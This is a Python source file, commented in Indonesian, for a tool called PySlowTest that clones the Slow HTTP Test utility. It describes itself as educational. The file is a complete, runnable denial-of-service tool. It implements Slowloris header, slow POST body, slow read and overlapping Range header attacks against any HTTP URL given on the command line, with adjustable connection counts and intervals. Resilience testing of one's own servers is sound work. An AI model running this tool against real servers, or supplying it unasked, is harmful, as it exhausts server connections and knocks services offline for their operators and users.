import socket
import random
import time
import argparse
import sys
import os

# --- Fungsi Utility ---

def generate_random_string(length):
    """Membuat string acak untuk header/body."""
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(chars) for _ in range(length))

def create_socket(host, port, timeout):
    """Mencoba membuat dan mengembalikan objek socket."""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        return s
    except Exception:
        if s:
            s.close()
        return None

# --- Fungsi Mode Serangan ---

def run_slowloris(host, port, count, interval, timeout, a_value, b_value):
    """Mode Slowloris (Header Attack - Mirip -H) dengan pelaporan status rinci."""
    print(f"\n{'='*50}\n[*] MODE: Slowloris (Header Attack)\n{'='*50}")
    print(f"[*] Target: {host}:{port} | Path: {a_value} | Koneksi Maks: {count} | Interval Kirim: {interval}s")
    
    base_headers = [
        f"User-Agent: PySlowTest-Agent/{generate_random_string(8)}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection: keep-alive"
    ]

    sockets = []
    failed_initial_count = 0
    closed_runtime_count = 0

    # 1. Fase Pembukaan Koneksi (PENDING -> CONNECTED / ERROR)
    print("\n--- FASE 1: PEMBUKAAN KONEKSI ---")
    for i in range(count):
        s = create_socket(host, port, timeout)
        if s:
            try:
                # [STATUS: CONNECTED] Koneksi berhasil
                request_line = f"GET {a_value}?{random.randint(0, 9999)} HTTP/1.1\r\n"
                s.send(request_line.encode('utf-8'))
                s.send(f"Host: {host}\r\n".encode('utf-8'))

                for header in base_headers:
                    s.send(f"{header}\r\n".encode('utf-8'))
                
                if b_value:
                    s.send(f"{b_value}\r\n".encode('utf-8'))
                    
                s.send(f"X-A: {generate_random_string(10)}\r\n".encode('utf-8'))
                
                sockets.append(s)
            except Exception:
                # [STATUS: ERROR] Error saat mengirim header awal
                s.close()
                failed_initial_count += 1
        else:
            # [STATUS: ERROR] Gagal koneksi (timeout/port tertutup)
            failed_initial_count += 1
            
        if (i + 1) % 10 == 0 or (i + 1) == count:
             print(f"-> Proses: {i+1}/{count} | CONNECTED: {len(sockets)} | ERROR (Awal): {failed_initial_count}")

    print(f"\n--- REPORT AWAL] Koneksi Aktif: {len(sockets)} | Gagal Awal: {failed_initial_count} ---\n")
    
    # 2. Fase Keep-Alive (CONNECTED -> CLOSED/ERROR)
    print("--- FASE 2: MENJAGA KONEKSI (KEEP-ALIVE) ---")

    while sockets:
        time.sleep(interval)
        
        # [STATUS: CONNECTED] Ini adalah semua koneksi yang masih dalam list 'sockets'
        for s in list(sockets):
            try:
                # Coba kirim data untuk menjaga koneksi
                new_header = f"X-B-{random.randint(1, 100)}: {generate_random_string(10)}\r\n"
                s.send(new_header.encode('utf-8'))
            except socket.error:
                # [STATUS: CLOSED/ERROR] Server menutup koneksi atau terjadi error I/O
                s.close()
                sockets.remove(s)
                closed_runtime_count += 1
            except Exception:
                # [STATUS: CLOSED/ERROR] Error tak terduga
                s.close()
                sockets.remove(s)
                closed_runtime_count += 1
        
        # Laporan Status Real-Time
        print(f"[*] STATUS: [ACTIVE: {len(sockets)}] [CLOSED/ERROR: {closed_runtime_count}] [INTERVAL: {interval}s]")

    print(f"\n{'='*50}\n[REPORT AKHIR] Slowloris selesai. Total Closed/Error Runtime: {closed_runtime_count}\n{'='*50}")


def run_slow_post(host, port, count, interval, timeout, body_size, a_value, b_value):
    """Mode Slow HTTP POST (Body Attack - Mirip -B)."""
    print(f"\n{'='*50}\n[*] MODE: Slow HTTP POST (Body Attack)\n{'='*50}")
    print(f"[*] Target: {host}:{port} | Body Size: {body_size} bytes | Koneksi Maks: {count} | Interval Kirim: {interval}s")

    sockets = []
    failed_initial_count = 0
    closed_runtime_count = 0

    print("\n--- FASE 1: PEMBUKAAN KONEKSI ---")
    for i in range(count):
        s = create_socket(host, port, timeout)
        if s:
            try:
                request = (
                    f"POST {a_value} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: {body_size}\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Connection: close\r\n"
                )
                if b_value:
                    request += f"{b_value}\r\n"
                
                request += "\r\n"
                s.send(request.encode('utf-8'))
                s.send(b"a=") # Kirim byte pertama dari body
                
                sockets.append(s)
            except Exception:
                s.close()
                failed_initial_count += 1
        else:
            failed_initial_count += 1
            
        if (i + 1) % 10 == 0 or (i + 1) == count:
             print(f"-> Proses: {i+1}/{count} | CONNECTED: {len(sockets)} | ERROR (Awal): {failed_initial_count}")
        
    print(f"\n--- REPORT AWAL] Koneksi Aktif: {len(sockets)} | Gagal Awal: {failed_initial_count} ---\n")
    
    # 2. Fase Pengiriman Body Lambat
    print("--- FASE 2: PENGIRIMAN BODY LAMBAT ---")
    bytes_sent = 2 # Sudah mengirim "a="
    chunk_size = 10 

    while sockets and bytes_sent < body_size:
        time.sleep(interval)
        
        for s in list(sockets):
            try:
                data_chunk = generate_random_string(chunk_size).encode('utf-8')
                s.send(data_chunk)
            except socket.error:
                s.close()
                sockets.remove(s)
                closed_runtime_count += 1
            except Exception:
                s.close()
                sockets.remove(s)
                closed_runtime_count += 1
        
        bytes_sent += chunk_size
        print(f"[*] STATUS: [ACTIVE: {len(sockets)}] [CLOSED/ERROR: {closed_runtime_count}] [BODY SENT: {bytes_sent}/{body_size}]")

    print(f"\n{'='*50}\n[REPORT AKHIR] Slow Post selesai. Total Closed/Error Runtime: {closed_runtime_count}\n{'='*50}")


def run_slow_read(host, port, count, interval, timeout, a_value, b_value):
    """Mode Slow Read Attack (Mirip -X)."""
    print(f"\n{'='*50}\n[*] MODE: Slow Read Attack\n{'='*50}")
    print(f"[*] Target: {host}:{port} | Koneksi Maks: {count} | Interval Baca: {interval}s")

    sockets = []
    failed_initial_count = 0
    closed_runtime_count = 0

    # 1. Fase Kirim Permintaan
    print("\n--- FASE 1: KIRIM PERMINTAAN & CONNECT ---")
    for i in range(count):
        s = create_socket(host, port, timeout)
        if s:
            try:
                request = (
                    f"GET {a_value} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: PySlowTest-Read-Agent/{generate_random_string(8)}\r\n"
                    "Connection: keep-alive\r\n"
                )
                if b_value:
                    request += f"{b_value}\r\n"
                request += "\r\n"
                
                s.send(request.encode('utf-8'))
                s.setblocking(False) # Non-blocking untuk recv() lambat
                sockets.append(s)
            except Exception:
                s.close()
                failed_initial_count += 1
        else:
            failed_initial_count += 1
            
        if (i + 1) % 10 == 0 or (i + 1) == count:
             print(f"-> Proses: {i+1}/{count} | CONNECTED: {len(sockets)} | ERROR (Awal): {failed_initial_count}")

    print(f"\n--- REPORT AWAL] Koneksi Aktif: {len(sockets)} | Gagal Awal: {failed_initial_count} ---\n")
    
    # 2. Fase Baca Lambat
    print("--- FASE 2: MEMBACA RESPONS LAMBAT (1 byte/interval) ---")
    while sockets:
        time.sleep(interval)
        
        for s in list(sockets):
            try:
                # Baca HANYA 1 byte
                data = s.recv(1) 
                if not data:
                    # Koneksi ditutup oleh server setelah semua data terkirim/server timeout
                    s.close()
                    sockets.remove(s)
                    closed_runtime_count += 1
            except socket.error as e:
                # Error (EAGAIN/EWOULDBLOCK) normal karena non-blocking, kecuali koneksi terputus
                err = e.args[0]
                if err != 11 and err != 35: 
                    s.close()
                    sockets.remove(s)
                    closed_runtime_count += 1
            except Exception:
                s.close()
                sockets.remove(s)
                closed_runtime_count += 1
        
        print(f"[*] STATUS: [ACTIVE: {len(sockets)}] [CLOSED/ERROR: {closed_runtime_count}] [INTERVAL: {interval}s]")

    print(f"\n{'='*50}\n[REPORT AKHIR] Slow Read selesai. Total Closed/Error Runtime: {closed_runtime_count}\n{'='*50}")


def run_range_header(host, port, count, interval, timeout, a_value, b_value):
    """Mode Range Header Attack (Mirip -R)."""
    print(f"\n{'='*50}\n[*] MODE: Range Header Attack\n{'='*50}")
    print(f"[*] Target: {host}:{port} | Koneksi Maks: {count}")
    
    sockets = []
    failed_initial_count = 0
    MAX_FILE_SIZE = 100 * 1024 * 1024 
    
    # 1. Fase Kirim Permintaan
    print("\n--- FASE 1: KIRIM PERMINTAAN RANGE ---")
    for i in range(count):
        s = create_socket(host, port, timeout)
        if s:
            try:
                # Membuat banyak range request yang tumpang tindih (5 hingga 100 range 1-byte)
                ranges = []
                for j in range(random.randint(5, 100)): 
                    start = random.randint(0, MAX_FILE_SIZE - 2)
                    ranges.append(f"{start}-{start}") 
                
                range_header = "bytes=" + ",".join(ranges)
                
                request = (
                    f"GET {a_value} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: PySlowTest-Range-Agent/{generate_random_string(8)}\r\n"
                    f"Range: {range_header}\r\n"
                )
                if b_value:
                    request += f"{b_value}\r\n"
                    
                request += "Connection: close\r\n\r\n"
                
                s.send(request.encode('utf-8'))
                
                sockets.append(s)
            except Exception:
                s.close()
                failed_initial_count += 1
        else:
            failed_initial_count += 1
            
        if (i + 1) % 10 == 0 or (i + 1) == count:
             print(f"-> Proses: {i+1}/{count} | SENT: {len(sockets)} | ERROR (Awal): {failed_initial_count}")

    print(f"\n--- REPORT AKHIR] Permintaan Range terkirim: {len(sockets)}. Menunggu {interval} detik... ---\n")

    # Fase tunggu respons diproses (interval digunakan sebagai waktu tunggu)
    time.sleep(interval) 
    closed_count = 0
    
    for s in sockets:
        try:
            # Baca respons untuk memastikan server memprosesnya
            s.recv(4096) 
            s.close()
            closed_count += 1
        except Exception:
            s.close()
            closed_count += 1
            
    print(f"[*] STATUS: {closed_count} koneksi Range ditutup setelah {interval} detik.")
    print(f"\n{'='*50}\n[REPORT AKHIR] Range Header Attack selesai.\n{'='*50}")


# --- Bagian Utama/Parser Argumen ---

def main():
    parser = argparse.ArgumentParser(
        description="Kloning Slow HTTP Test (Multi-Mode) untuk tujuan edukasi.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    # Opsi Umum
    parser.add_argument('-u', '--url', required=True, 
                        help='Target URL. Contoh: http://127.0.0.1:80')
    parser.add_argument('-m', '--mode', default='header', choices=['header', 'body', 'read', 'range'],
                        help='Mode serangan. Pilih "header" (Slowloris), "body" (Slow POST), "read" (-X), atau "range" (-R). Default: header.')
                        
    # Opsi Konfigurasi (-c, -i, -t, -x)
    parser.add_argument('-c', '--connections', type=int, default=100, 
                        help='(-c) Jumlah koneksi/socket. Default: 100.')
    parser.add_argument('-i', '--interval', type=int, default=10, 
                        help='(-i) Interval pengiriman/pembacaan data (detik). Default: 10.')
    parser.add_argument('-t', '--timeout', type=int, default=4, 
                        help='(-p) Timeout koneksi awal (detik). Default: 4.')
    parser.add_argument('-x', '--body_size', type=int, default=4096, 
                        help='(-x) (Hanya mode body) Ukuran body POST. Default: 4096 bytes.')
                        
    # Opsi Tambahan (-a, -b)
    parser.add_argument('-a', '--path', default=None, 
                        help='(-a) Path target pada server (diabaikan jika path sudah ada di -u). Default: /')
    parser.add_argument('-b', '--header', default='', 
                        help='(-b) Header tambahan yang akan ditambahkan ke setiap permintaan (format: Header: Value)')
    
    args = parser.parse_args()

    # Parsing URL untuk mendapatkan Host, Port, dan Path
    try:
        url_part = args.url.replace("http://", "").replace("https://", "")
        
        # Pisahkan host:port dari path
        parts = url_part.split('/', 1)
        host_port = parts[0]
        url_path = '/' + parts[1] if len(parts) > 1 else '/'

        # Ambil Host dan Port
        if ":" in host_port:
            host, port_str = host_port.split(":", 1)
            port = int(port_str)
        else:
            host = host_port
            port = 80 # Default HTTP port
        
        # Prioritaskan -a jika disetel secara eksplisit, jika tidak gunakan path dari URL
        if args.path is None:
            args.path = url_path
        elif not args.path.startswith('/'):
            args.path = '/' + args.path

    except Exception as e:
        print(f"[-] Format URL tidak valid atau parsing error: {e}")
        print("Penggunaan: http://host:port/path")
        sys.exit(1)
        
    print(f"\n{'#'*50}")
    print(f"# PySlowTest - Klon Slow HTTP Test (Mode {args.mode.upper()}) #")
    print(f"{'#'*50}")
    
    try:
        if args.mode == 'header':
            run_slowloris(host, port, args.connections, args.interval, args.timeout, args.path, args.header)
        elif args.mode == 'body':
            run_slow_post(host, port, args.connections, args.interval, args.timeout, args.body_size, args.path, args.header)
        elif args.mode == 'read':
            run_slow_read(host, port, args.connections, args.interval, args.timeout, args.path, args.header)
        elif args.mode == 'range':
            run_range_header(host, port, args.connections, args.interval, args.timeout, args.path, args.header)
            
    except KeyboardInterrupt:
        print("\n[!] Program dihentikan oleh pengguna (Ctrl+C).")
        print("[!] Tutup semua koneksi yang tersisa secara manual.")
        sys.exit(0)


if __name__ == "__main__":
    main()